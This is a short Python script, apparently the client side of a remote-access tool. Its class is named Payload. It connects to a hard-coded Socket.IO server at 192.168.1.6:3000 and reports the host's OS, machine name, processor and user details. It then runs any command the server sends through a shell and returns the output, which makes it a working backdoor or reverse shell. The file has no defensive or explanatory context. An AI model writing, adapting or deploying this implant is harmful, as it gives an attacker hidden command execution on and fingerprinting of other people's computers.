import socketio
import platform
from datetime import datetime
import subprocess

# Create a Socket.IO client
sio = socketio.Client()

class Payload:
    def __init__(self) -> None:
        #connect socket
        self.sio = socketio.Client()
        self.sio.connect('http://192.168.1.6:3000') 
        self.joinRoom()

        #get command from server ,process and return data
        @self.sio.on('runcmd')
        def handle_message(message):
            finalResult =""
            print(f'Received message: {message}')
            # send result back
            try:
                result = subprocess.run(message['cmd'],shell=True,stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                finalResult = result.stdout
            except Exception as e:
                finalResult="Wrong Command"
                print(e)
            self.sio.emit('reply',{"to":message['from'],"result":finalResult})

        #ping test
        @self.sio.on('pingTest')
        def pingtest(data):
            print('received ping req')
            admin = data["from"]
            print(f"got ping from {admin}")
            self.sio.emit("pingReply",{"to":admin})
            print("sending reply")
        
        
    def joinRoom(self):
        self.sio.emit('joinRoom', {"user":True,"os":platform.platform(),"time":datetime.now().strftime('%Y-%m-%d %H:%M:%S'),"data":{
        "node":platform.node(),"processor":platform.processor(),"pythonVersion":platform.python_version(),
        "release":platform.release(),"user":platform.uname()}})
   
payload = Payload()